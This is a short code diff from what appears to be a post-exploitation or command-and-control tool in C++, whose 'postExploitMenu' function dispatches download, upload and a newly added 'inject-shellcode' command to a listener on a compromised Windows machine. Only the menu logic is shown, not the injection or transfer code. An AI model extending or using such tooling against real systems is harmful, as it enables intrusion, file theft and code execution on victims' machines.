@@ -19,9 +19,13 @@ void postExploitMenu(listener *newL) {
 			printf("You Selected Download\n");
 			newL->downloadFile("C:\\\\Users\\\\john\\\\Desktop\\\\download.txt", "download.txt");
 		}
-		if(!cmd.compare("upload")){
+		if (!cmd.compare("upload")){
 			printf("You Selected Upload\n");
 			newL->uploadFile("upload.txt", "C:\\\\test\\\\upload.txt");
+		}
+		if(!cmd.compare("inject-shellcode")){
+			printf("You Selected Shell\n");
+			newL->injectShellcode();
 		}
 		if(!cmd.compare("exit")){
 			printf("Exiting!\n");
